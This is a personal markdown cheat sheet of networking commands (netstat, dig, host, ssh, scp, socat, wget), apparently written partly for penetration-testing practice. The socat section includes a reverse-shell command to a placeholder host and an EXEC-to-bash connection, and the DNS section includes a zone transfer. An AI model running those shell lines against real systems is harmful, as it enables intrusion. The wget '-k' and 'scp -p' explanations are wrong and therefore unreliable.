# Networking Basics and a Bit Beyond

Netstat, DNS utils, SSH, SCP, Netcat,


## netstat

> Standard Netstat commands.  Would make good Aliases?

```sh
# find all established connections
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
# find all established connections by port
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f2 | sort | uniq -c | sort -n
# find all established connections by ip and port
netstat -an | grep ESTABLISHED | awk '{print $5}' | sort | uniq -c | sort -n
# get all listening ports
netstat -an | grep LISTEN | awk '{print $4}' | cut -d: -f2 | sort | uniq -c | sort -n
# get all listening ports by ip
netstat -an | grep LISTEN | awk '{print $4}' | cut -d: -f1 | sort | uniq -c | sort -n
# get all listening ports by ip and port
netstat -an | grep LISTEN | awk '{print $4}' | sort | uniq -c | sort -n
```

## DNS

["Actually one of the best DNS tutorials I've Seen"]https://www.cloudflare.com/learning/dns/what-is-dns/)

### DIG (Domain Information Groper)

```bash
## DIG commands
dig www.google.com
dig www.google.com A                    
dig www.google.com A +short             # short cuts down on the output
dig www.google.com ANY +noall +answer   # Returns all records
dig -x 192.168.8.8 +noall +answer       # Reverse lookup
dig www.google.com A +noall +answer     # Returns all A records
dig www.google.com +nocomments \        # only answer section
   +noquestion +noauthority \
   +noadditional +nostats      
dig www.google.com A +noall \           # ttl - time to live records
    +answer +ttlid 
dig www.google.com A +noall \           # get the ttl for the record
  +answer +ttlid | grep -v '^;' \
  | awk '{print $2}'
dig @ns1.google.com google.com axfr     # zone transfer
### DNS record types
dig www.google.com MX +short            # mail
dig www.google.com NS +short            # name server
dig www.google.com TXT +short           # text
dig www.google.com SOA +short           # start of authority
dig www.google.com CNAME +short         # canonical name
```
### Host
return multiple files.
```
kali@kali:~$ host -t mx megacorpone.com
megacorpone.com mail is handled by 10 fb.mail.gandi.net.
megacorpone.com mail is handled by 50 mail.megacorpone.com.
megacorpone.com mail is handled by 60 mail2.megacorpone.com.
megacorpone.com mail is handled by 20 spool.mail.gandi.net.
```

## SSH 

> Non Default things
  A few non std things like, Proxy Chains, mounting dirs (with external Lib), ect

```sh
# To ssh via pem file (which normally needs 0600 permissions):
ssh -i <pemfile> <user>@<host>
# To connect on a non-standard port:
ssh -p <port> <user>@<host>
# To connect and forward the authentication agent:
ssh -A <user>@<host>
# To execute a command on a remote server:
ssh -t <user>@<host> 'the-remote-command'
# To connect to a host with a specific key exchange algorithm:
# Full list of available algorithms : man ssh_config
ssh -oKeXAlgorithms=+diffie-hellman-group-exchange-sha1 <user>@<server>
# To tunnel an x session over SSH:
ssh -X <user>@<host>
# Redirect traffic with a tunnel between local host (port 8080) and a remote
# host (remote.example.com:5000) through a proxy (personal.server.com):
ssh -f -L 8080:remote.example.com:5000 user@personal.server.com -N
# To launch a specific x application over SSH:
ssh -X -t <user>@<host> 'chromium-browser'
# To create a SOCKS proxy on localhost and <port>:
ssh -qND <port> <user>@<host>
# To tunnel an ssh session over the SOCKS proxy on localhost and port 9999:
ssh -o "ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p" <user>@<host>
# -X use an xsession, -C compress data, "-c blowfish" use the encryption blowfish:
ssh <user>@<host> -C -c blowfish -X
# To copy files and folders through ssh from remote host to pwd with tar.gz
# compression when there is no rsync command available:
ssh <user>@<host> "cd /var/www/Shared/; tar zcf - asset1 asset2" | tar zxf -
# To mount folder/filesystem through SSH
# Install SSHFS from https://github.com/libfuse/sshfs
# Will allow you to mount a folder securely over a network.
sshfs <user>@<host>:/path/to/folder /path/to/mount/point
# Emacs can read file through SSH
# Doc: http://www.gnu.org/software/emacs/manual/html_node/emacs/Remote-Files.html
emacs /ssh:<user>@<host>:<file>
```
<hr />

# SCP 

> Custom port, SOCKy, and Multi Machine.

```bash

# Custom Port copy a file from your local machine to a remote server:
scp -p 1234 <file> <user>@host:<destf>

# To scp a file over a SOCKS proxy on localhost and port 9999 (see ssh for tunnel setup):
scp -o "ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p" <file> <user>@<host>:<dest>

# To scp between two remote servers from the third machine
scp -3 <user>@<host1>:<src> <user>@<host2>:<dest>
```
<hr />

# Netcat

>  SANS always has great resources

<object width="400" height="500" type="application/pdf" data="../docs/NC_SANS.pdf?#zoom=85&scrollbar=0&toolbar=0&navpanes=0">
<p> Cant render.</p>

[SANS NC Cheat Sheet](../docs/NC_SANS.pdf)
</object>

## Socat

### netcat comparsion socat

```sh

sudo nc -lvp localhost 443
sudo socat TCP4-LISTEN:443 STDOUT
```

### Socat Examples

```sh
# socat connect to http-server (port 80 on 'somesite.com')
socat TCP4:somesite.com:80 -
# connect to https-server (port 443 on 'somesite.com' with tls)
socat openssl:somesite.com:443 -
# listen, increased verbosity, and print to STDOUT
socat -d -d TCP4-LISTEN:443 STDOUT
# EXEC option (similar to the Netcat -e option)
socat TCP4:somesite.com:443 EXEC:/bin/bash
# tcp-listener (port 3180), output as hexdump (-x) and fork for new connetions
socat -x tcp-listen:3180,fork -
# echo executable and connect via tcp 
echo "bash" | socat -d -d TCP4-CONNECT:172.16.53.20:456 STDOUT
# http-example:  
#  (sleep is necessary to prevent socat closing socket before data received)
(echo -e "GET / HTTP/1.1\r\nHost: somesite.com\r\n\r" && sleep 1) \
| socat tcp4:somesite.com:80 -
# http to httpS 'Proxy' (for an webserver without TLS-Support)
socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80
# port forwarding (e.g. own port 3180 to port 22(ssh) on target
socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:somesite.com:ssh
# TOR-forwarding (needs tor-daemon on port 9050 running)
socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050
# network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)
socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200
# udp to tcp
socat -u udp-recvfrom:1234,fork tcp:localhost:4321
# reverse shell:
socat exec:'bash -i',pty,stderr tcp:remote.somesite.com:3180
# listener for above reverse shell (on remote.somesite.com):
socat file:`tty`,raw,echo=0 tcp-listen:3180 # or: nc -lp 3180
```

## WGET 

### Examples 

Rucursive WGET Search for String and removing downloaded (6 layers deep son) site.

    SITEURL="https://www.example.com"
    wget -r -l6 -p -nc -k $SITEURL && grep -r "STRING2SEARCH" . && rm -r $SITEURL

    - p option: page-requisites downloads all files (css,js, ect) to render page correctly
    
    - l option is how many layers deep to go, son
    
    - nc option: no-clobber, don't hulk smash and ensure files aren't overwritten, adds
      suffix to filename.

    - k skip cert checks

Further examples:

```sh
# To download <url>:
wget <url>
# download all content
wget --recursive <url>
# To download multiples files with multiple URLs:
wget <url>...
# To download <url> and specify output name:
wget <url> -O <outfile>
# To download <url> into <dir>:
wget -P <dir> <url>
# To continue an aborted downloaded:
wget -c <url>
# To parse a file that contains a list of URLs to fetch each one:
# Ignore cert check
wget --no-check-certificate <url>
wget -i url_list.txt
# To mirror a whole page locally:
wget -pk <url>
# To mirror a whole site locally:
wget -mk <url>
# To download files according to a pattern:
wget http://example.com/files-{1..15}.tar.bz2
# To download all the files in a directory with a specific extension if directory indexing is enabled:
wget -r -l1 -A.extension http://example.com/directory
# To download only response headers (-S --spider) and display them on stdout (-O -).:
wget -S --spider -O - <url>
# To change the User-Agent to 'User-Agent: toto':
wget -U 'toto' <url>
# To download a file with spec
wget --limit-rate=500k <url>
```


